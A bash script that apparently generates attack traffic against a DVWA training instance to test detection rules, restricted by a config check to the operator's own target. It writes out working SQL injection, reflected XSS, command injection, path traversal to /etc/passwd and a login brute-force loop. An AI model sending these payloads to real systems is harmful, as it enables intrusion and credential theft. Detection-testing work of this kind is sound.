#!/bin/bash
# LAB USE ONLY - target must match attack-sim/target.conf (your own EC2 instance)
# Usage: ./sqli-xss.sh <target_ip> <attack_type>
# attack_type: sqli | xss | cmdi | traversal | bruteforce | all
#
# DVWA requires an authenticated session before the vulnerable modules will run
# their code: an unauthenticated request just bounces off login.php and never
# reaches the sink, so the payload would never appear in the access log. This
# script therefore logs in first (fetching DVWA's CSRF user_token), then sends
# every payload with the resulting session cookie. Credentials come from
# target.conf (DVWA_USER / DVWA_PASS).

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONF="$SCRIPT_DIR/target.conf"
TARGET="$1"
ATTACK="$2"
LOGFILE="$SCRIPT_DIR/attack-log.txt"

if [[ ! -f "$CONF" ]]; then
    echo "Missing $CONF — copy target.conf.example to target.conf and set ALLOWED_TARGET."
    exit 1
fi
source "$CONF"

if [[ -z "$TARGET" || "$TARGET" != "$ALLOWED_TARGET" ]]; then
    echo "Refusing to run: target must exactly match ALLOWED_TARGET in target.conf ($ALLOWED_TARGET)"
    exit 1
fi

# Defaults so older target.conf files (without these keys) keep working.
DVWA_USER="${DVWA_USER:-admin}"
DVWA_PASS="${DVWA_PASS:-password}"
DVWA_SCHEME="${DVWA_SCHEME:-http}"

BASE="$DVWA_SCHEME://$TARGET/dvwa/vulnerabilities"
LOGIN_URL="$DVWA_SCHEME://$TARGET/dvwa/login.php"

# Per-run cookie jar so concurrent invocations don't collide.
COOKIE_JAR="$(mktemp)"
trap 'rm -f "$COOKIE_JAR"' EXIT

log() {
    echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) | sqli-xss:$1 | target=$TARGET | operator=$(whoami)" >> "$LOGFILE"
}

# Extract a CSRF token from a DVWA page. DVWA prints it as:
#   <input type='hidden' name='user_token' value='<32 hex>' />
extract_token() {
    grep -oE "user_token' value='[a-f0-9]+" | head -1 | cut -d"'" -f3
}

# Log in and leave a valid session in $COOKIE_JAR. Dies if login fails, so we
# never emit "attacks" that are really just redirects to login.php.
dvwa_login() {
    local token landing

    token=$(curl -s -c "$COOKIE_JAR" "$LOGIN_URL" | extract_token)

    if [[ -z "$token" ]]; then
        echo "ERROR: could not read DVWA login CSRF token from $LOGIN_URL" >&2
        exit 1
    fi

    curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -o /dev/null \
        -d "username=$DVWA_USER&password=$DVWA_PASS&Login=Login&user_token=$token" \
        "$LOGIN_URL"

    # DVWA redirects to index.php for a *successful* login and back to
    # login.php for a failed one — but both answer with 302, so the status code
    # proves nothing. Follow the session into index.php and look for the
    # authenticated marker instead.
    landing=$(curl -s -b "$COOKIE_JAR" -L "$DVWA_SCHEME://$TARGET/dvwa/index.php")

    if ! grep -qi "You have logged in" <<<"$landing"; then
        echo "ERROR: DVWA login failed for user '$DVWA_USER' (session never reached index.php)" >&2
        echo "       Check DVWA_USER/DVWA_PASS in target.conf and that DVWA is set up." >&2
        exit 1
    fi
}

run_sqli() {
    log "sqli"
    curl -s -b "$COOKIE_JAR" "$BASE/sqli/?id=1' OR 1=1-- -&Submit=Submit" -o /dev/null
    curl -s -b "$COOKIE_JAR" "$BASE/sqli/?id=1' UNION SELECT user,password FROM users-- -&Submit=Submit" -o /dev/null
}

run_xss() {
    log "xss"
    curl -s -b "$COOKIE_JAR" "$BASE/xss_r/?name=<script>alert(1)</script>" -o /dev/null
}

run_cmdi() {
    log "cmdi"
    curl -s -b "$COOKIE_JAR" -d "ip=127.0.0.1;whoami&Submit=Submit" "$BASE/exec/" -o /dev/null
}

run_traversal() {
    log "traversal"
    curl -s -b "$COOKIE_JAR" "$BASE/fi/?page=../../../../etc/passwd" -o /dev/null
    curl -s -b "$COOKIE_JAR" "$BASE/fi/?page=php://filter/convert.base64-encode/resource=include.php" -o /dev/null
}

run_bruteforce() {
    # rule needs >=20 POSTs within 2 minutes. Login failures are exactly what
    # the rule counts, so hit login.php with wrong passwords using a throwaway
    # session (not the authenticated jar).
    local bf_jar i token
    log "web-bruteforce"
    bf_jar="$(mktemp)"
    for i in $(seq 1 25); do
        token=$(curl -s -c "$bf_jar" "$LOGIN_URL" | extract_token)
        curl -s -b "$bf_jar" -o /dev/null \
            -d "username=$DVWA_USER&password=wrong$i&Login=Login&user_token=$token" \
            "$LOGIN_URL"
    done
    rm -f "$bf_jar"
}

# Validate the attack type before doing any network work.
case "$ATTACK" in
    sqli|xss|cmdi|traversal|bruteforce|all) ;;
    *) echo "Usage: ./sqli-xss.sh <target_ip> {sqli|xss|cmdi|traversal|bruteforce|all}"; exit 1 ;;
esac

# Everything except pure brute-force needs a valid session first.
if [[ "$ATTACK" != "bruteforce" ]]; then
    dvwa_login
fi

case "$ATTACK" in
    sqli) run_sqli ;;
    xss) run_xss ;;
    cmdi) run_cmdi ;;
    traversal) run_traversal ;;
    bruteforce) run_bruteforce ;;
    all) run_sqli; run_xss; run_cmdi; run_traversal; run_bruteforce ;;
esac
